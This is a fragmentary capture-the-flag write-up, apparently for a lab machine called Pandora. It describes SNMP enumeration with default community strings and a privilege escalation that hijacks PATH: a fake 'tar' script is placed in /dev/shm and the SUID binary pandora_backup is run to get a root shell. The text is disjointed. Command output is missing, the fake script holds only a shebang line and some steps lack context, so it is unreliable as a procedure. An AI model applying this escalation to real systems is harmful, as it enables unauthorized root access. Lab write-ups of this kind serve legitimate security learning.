Foothold

SNMP (Simple Network Management Protocol) monitors/manages network devices (routers, switches, printers). Uses OIDs to read/write device data. Ports UDP 161/162. Versions v1/v2c (insecure), v3 (secure). Risk: default community strings.

Use SNMP to enumerate device info (snmpwalk) and find credentials/config via default or weak community strings (v1/v2c). If write access exists, modify configs (e.g., change TFTP/boot params) or retrieve secrets. Prioritize detection/audit over destructive actions.

matt@pandora:/home/matt$ mkdir .ssh #on the target machine

Look at the line underlined in red. This line calls tar command without FULL PATH. Also, we can see the stem of the error is openning root file without privilege. Therefore, if we could use our arbitrary file named 'tar', we can generate root bash.

$PATH-hijack takes advantage of this situation. Let's exploit!

matt@pandora:~$ export PATH=/dev/shm:$PATH #Create new $PATH
matt@pandora:~$ echo $PATH

matt@pandora:~$ cd /dev/shm
matt@pandora:/dev/shm$ nano tar
#!/bin/bash

matt@pandora:/dev/shm$ chmod +x tar
matt@pandora:/dev/shm$ ls

matt@pandora:/dev/shm$ /usr/bin/pandora_backup
